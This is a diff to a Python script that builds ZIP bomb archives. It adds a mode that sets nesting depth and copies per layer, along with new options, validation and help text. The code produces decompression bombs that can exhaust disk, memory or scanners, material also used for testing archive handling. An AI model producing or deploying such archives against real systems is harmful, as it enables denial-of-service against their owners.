@@ -107,8 +107,8 @@ def get_files_depth_and_size(total_size):
 		actual_size = files_nb**files_nb * file_size
 	return files_nb, file_size
 		
-	
-def make_zip_nested(size_MB, out_zip_file, include_dirs, include_files):
+
+def make_zip_nested_by_size(size_MB, out_zip_file, include_dirs, include_files):
 	"""
 	Creates nested zip file (zip file of zip files of zip files etc.).
 	"""
@@ -117,7 +117,10 @@ def make_zip_nested(size_MB, out_zip_file, include_dirs, include_files):
 		return make_zip_flat(size_MB, out_zip_file)
 	
 	depth, file_size = get_files_depth_and_size(size_MB)
-	actual_size = depth**depth*file_size 
+	return make_zip_nested_by_depth(depth, depth, file_size, out_zip_file, include_dirs, include_files)
+
+def make_zip_nested_by_depth(depth, ncopies, file_size, out_zip_file, include_dirs, include_files):
+	actual_size = ncopies**depth*file_size 
 	print('Warning: Using nested mode. Actual size may differ from given.')
 	
 	# Prototype zip file
@@ -130,7 +133,7 @@ def make_zip_nested(size_MB, out_zip_file, include_dirs, include_files):
 	
 	for i in range(1,depth+1):
 		zf = zipfile.ZipFile('%d.zip'%(i+1), mode='w', allowZip64=True)
-		make_copies_and_compress(zf, '%d.zip'%i,depth)
+		make_copies_and_compress(zf, '%d.zip'%i,ncopies)
 		os.remove('%d.zip'%i)
 		if i == depth:
 			# Include selected dirs
@@ -148,7 +151,12 @@ def make_zip_nested(size_MB, out_zip_file, include_dirs, include_files):
 def help_epilog():
 	return """mode of compression options:
   flat - flat zip file with contents
-  nested - nested zip file, zip of zips of zips ... (much smaller) """
+  nested-size - nested zip file, zip of zips of zips ... (much smaller)
+	-S to specify the size
+  nested-depth - same, but based on depth and number of copies per layer arguments
+    -D to specify depth
+    -C to specify number of copies per layer of depth
+   """
 	
 	
 if __name__ == '__main__':
@@ -156,25 +164,38 @@ if __name__ == '__main__':
 	parser = argparse.ArgumentParser(description='Creates ZIP bomb archive.', 
 				formatter_class=argparse.RawDescriptionHelpFormatter, epilog=help_epilog())
 	parser.add_argument('-d', '--dirs', action='store', 
-		help='add directory contents to ZIP file. multiple directiroes separated with comma', default='')
+		help='add directory contents to ZIP file. multiple directiroes separated with comma', default=None)
 	parser.add_argument('-f', '--files', action='store', 
-		help='add files (can be directory) to ZIP file. multiple files separated with comma', default='')
-	parser.add_argument('mode', help='mode of compression. see choices description below', choices=('flat', 'nested'))
-	parser.add_argument('size', help='decompression size in MB', type=int)
+		help='add files (can be directory) to ZIP file. multiple files separated with comma', default=None)
+	parser.add_argument('mode', help='mode of compression. see choices description below', choices=('flat', 'nested-size', 'nested-depth'))
+	parser.add_argument('-D', '--depth', action='store', help='for nested-depth: nesting depth', type=int, default=None)
+	parser.add_argument('-C', '--copies', action='store', help='for nested-depth: copies per layer', type=int, default=None)
+	parser.add_argument('-S', '--size', help='for nested-size: decompression size in MB', type=int, default=None)
 	parser.add_argument('out_zip_file', help='path to destination file')
 	
 	args = parser.parse_args()
 	
 	out_zip_file = args.out_zip_file
 	
-	include_dirs = [d.strip() for d in args.dirs.strip().split(',') if d is not '']
-	include_files = [d.strip() for d in args.files.strip().split(',') if d is not '']
+	include_dirs = ([d.strip() for d in args.dirs.strip().split(',') if d != '']) if (args.dirs is not None) else []
+	include_files = ([d.strip() for d in args.files.strip().split(',') if d != '']) if (args.files is not None) else []
 	
 	start_time = time.time()
 	if args.mode == 'flat':
+		if args.size == None:
+			parser.parse_args("--help".split())
+			exit(-1)
 		actual_size = make_zip_flat(args.size, out_zip_file, include_dirs, include_files)
+	elif args.mode == 'nested-depth':
+		if args.depth == None or args.copies == None:
+			parser.parse_args("--help".split())
+			exit(-1)
+		actual_size = make_zip_nested_by_depth(args.depth, args.copies, 1, out_zip_file, include_dirs, include_files)
 	else:
-		actual_size = make_zip_nested(args.size, out_zip_file, include_dirs, include_files)
+		if args.size == None:
+			parser.parse_args("--help".split())
+			exit(-1)
+		actual_size = make_zip_nested_by_size(args.size, out_zip_file, include_dirs, include_files)
 	end_time = time.time()
 	print('Compressed File Size: %.2f KB'%(os.stat(out_zip_file).st_size/1024.0))
 	print('Size After Decompression: %d MB'%actual_size)
